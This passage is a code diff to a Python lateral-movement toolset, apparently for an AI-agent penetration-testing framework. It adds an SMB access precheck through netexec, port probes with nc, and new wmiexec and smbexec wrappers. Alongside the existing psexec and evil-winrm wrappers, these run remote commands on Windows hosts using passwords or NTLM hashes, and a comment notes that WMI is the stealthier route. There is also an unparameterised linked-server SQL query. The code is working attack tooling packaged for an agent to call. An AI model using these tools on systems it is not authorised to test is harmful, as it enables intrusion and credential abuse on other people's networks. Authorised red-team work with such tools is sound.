         # Execute on linked server using OPENQUERY or AT syntax
-        # nosec B608 - intentional SQL for MSSQL pentest enumeration
+        # nosec B608 - intentional SQL for MSSQL pentest recon
         sql_query = f"EXEC ('{query}') AT [{linked_server}];"
 
         cmd_string = f'echo "{sql_query}" | mssqlclient.py {target_string}'
@@ -5181,6 +5719,47 @@ class LateralMovementTools(Toolset):
         """Set the operation state for this toolset."""
         self.state = state
 
+    def _check_port(self, target: str, port: int, timeout_seconds: int = 5) -> bool:
+        cmd = ["nc", "-zv", "-w", str(timeout_seconds), target, str(port)]
+        try:
+            ssm_timeout = max(30, timeout_seconds + 5)
+            _stdout, _stderr, returncode = _run_tool(cmd, timeout_seconds=ssm_timeout)
+            return returncode == 0
+        except Exception:
+            return False
+
+    def _check_smb_exec(
+        self,
+        target: str,
+        username: str,
+        password: str | None,
+        hash: str | None,
+        domain: str | None,
+    ) -> bool | None:
+        if not (password or hash):
+            return None
+        cmd = ["netexec", "smb", target, "-u", username]
+        if password:
+            cmd.extend(["-p", password])
+        elif hash:
+            cmd.extend(["-H", hash])
+        if domain:
+            cmd.extend(["-d", domain])
+        cmd.extend(["-x", "whoami"])
+        try:
+            stdout, stderr, _ = _run_tool(cmd, timeout_seconds=120)
+        except Exception:
+            return None
+        output = (stdout or "") + ("\n" + stderr if stderr else "")
+        lowered = output.lower()
+        if "pwn3d" in lowered or "command output" in lowered or "whoami" in lowered:
+            return True
+        if "access denied" in lowered or "nt_status_access_denied" in lowered:
+            return False
+        if "logon failure" in lowered or "status_logon_failure" in lowered:
+            return False
+        return None
+
     @dn.tool_method
     def evil_winrm(
         self,
@@ -5212,6 +5791,8 @@ class LateralMovementTools(Toolset):
             >>> evil_winrm("192.168.56.22", "admin", password="pass")  # pragma: allowlist secret
             >>> evil_winrm("192.168.56.22", "admin", hash="aad3b435...")
         """
+        if not (self._check_port(target, 5985) or self._check_port(target, 5986)):
+            return f"[!] WinRM not reachable on {target} (ports 5985/5986 closed)"
         cmd = ["evil-winrm", "-i", target, "-u", username]
 
         if password:
@@ -5276,8 +5857,15 @@ class LateralMovementTools(Toolset):
         Example:
             >>> psexec("192.168.56.22", "admin", password="pass", command="whoami")  # pragma: allowlist secret
         """
-        target_string = f"{domain}/{username}" if domain else username
-        target_string += f":{password}@{target}" if password else f"@{target}"
+        precheck = self._check_smb_exec(target, username, password, hash, domain)
+        if precheck is False:
+            return "[!] SMB exec precheck failed; admin access likely missing."
+
+        if hash and not password:
+            target_string = f"{domain}/{username}@{target}" if domain else f"{username}@{target}"
+        else:
+            target_string = f"{domain}/{username}" if domain else username
+            target_string += f":{password}@{target}" if password else f"@{target}"
 
         cmd = ["impacket-psexec", target_string]
 
@@ -5293,3 +5881,77 @@ class LateralMovementTools(Toolset):
 
         except Exception as e:
             return f"PsExec failed: {e}"
+
+    @dn.tool_method
+    def wmiexec(
+        self,
+        target: str,
+        username: str,
+        password: str | None = None,
+        hash: str | None = None,
+        domain: str | None = None,
+        command: str = "whoami",
+    ) -> str:
+        """
+        Execute command via WMI (impacket-wmiexec).
+
+        WMI execution is often more stealthy than PsExec.
+        """
+        precheck = self._check_smb_exec(target, username, password, hash, domain)
+        if precheck is False:
+            return "[!] SMB exec precheck failed; admin access likely missing."
+
+        if hash and not password:
+            target_string = f"{domain}/{username}@{target}" if domain else f"{username}@{target}"
+        else:
+            target_string = f"{domain}/{username}" if domain else username
+            target_string += f":{password}@{target}" if password else f"@{target}"
+
+        cmd = ["impacket-wmiexec", target_string]
+        if hash:
+            cmd.extend(["-hashes", f":{hash}"])
+        cmd.extend([command])
+
+        try:
+            logger.info(f"[*] Executing via WMI on {target}")
+            stdout, stderr, _ = _run_tool(cmd, timeout_seconds=120)
+            return stdout + "\n" + (stderr or "")
+        except Exception as e:
+            return f"WMIExec failed: {e}"
+
+    @dn.tool_method
+    def smbexec(
+        self,
+        target: str,
+        username: str,
+        password: str | None = None,
+        hash: str | None = None,
+        domain: str | None = None,
+        command: str = "whoami",
+    ) -> str:
+        """
+        Execute command via SMB service (impacket-smbexec).
+
+        SMBExec creates a service per command and retrieves output over SMB.
+        """
+        precheck = self._check_smb_exec(target, username, password, hash, domain)
+        if precheck is False:
+            return "[!] SMB exec precheck failed; admin access likely missing."
+
+        if hash and not password:
+            target_string = f"{domain}/{username}@{target}" if domain else f"{username}@{target}"
+        else:
+            target_string = f"{domain}/{username}" if domain else username
+            target_string += f":{password}@{target}" if password else f"@{target}"
+
+        cmd = ["impacket-smbexec", target_string]
+        if hash:
+            cmd.extend(["-hashes", f":{hash}"])
+        cmd.extend([command])
+
+        try:
+            logger.info(f"[*] Executing via SMBExec on {target}")
+            stdout, stderr, _ = _run_tool(cmd, timeout_seconds=120)
+            return stdout + "\n" + (stderr or "")
+        except Exception as e:
+            return f"SMBExec failed: {e}"
